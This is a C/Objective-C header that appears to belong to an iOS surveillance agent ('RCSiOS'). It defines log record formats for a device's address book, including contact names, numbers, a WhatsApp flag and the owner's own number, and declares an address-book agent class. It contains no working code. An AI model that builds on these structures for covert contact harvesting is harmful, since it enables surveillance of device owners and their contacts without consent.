/*
 * RCSiOS - messages agent
 *
 *
 * Created by Massimo Chiodini on 12/12/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSICommon.h"
#import "RCSIAgent.h"

#ifndef __RCSIAgentAddressBook_h__
#define __RCSIAgentAddressBook_h__

#import "RCSILogManager.h"

/*
 * only for chat contacts
 */
#define	CONTACT_LOG_VERSION_NEW	0x01000001
typedef struct _organizerAdditionalHeader{
  u_int32_t size;
  u_int32_t version;
  u_int32_t identifier;
  u_int32_t program;
  u_int32_t flags;
} organizerAdditionalHeader;
/**/

typedef struct _Names {
#define CONTACTNAME   0xC025
  int     magic;
  int     len;
  //wchar_t buffer[1];
} Names;

typedef struct _ABNumbers {
#define CONTACTNUM    0xC024
  int     magic;
  int     type;
  //Names   number;
} ABNumbers;

typedef struct _ABContats {
#define CONTACTCNT    0xC023
  int         magic;
  int         numContats;
  //ABNumbers contact[1];
} ABContats;

typedef struct _ABFile {
#define CONTACTFILE   0xC022
  int       magic;
  int       flag; //= 0x80000000 if ourself || 0x00000001 = whatsapp
  int       len;
  //Names      first;
  //Names      last;
  //ABContacts contact[1];
} ABFile;

typedef struct _ABLogStrcut {
#define   CONTACTLIST   0xC021
#define   CONTACTLIST_2 0x1000C021
  int     magic;
  int     len;
  int     numRecords;
  //ABFile  file[1];
} ABLogStrcut;

@interface _i_AgentAddressBook : _i_Agent <Agents>
{
  int                 abChanges;
  CFAbsoluteTime      mLastABDateTime;
  BOOL                mIsMyContactSaved;
  NSString            *mMyPhoneNumber;
}

- (id)initWithConfigData:(NSData*)aData;

@end

#endif
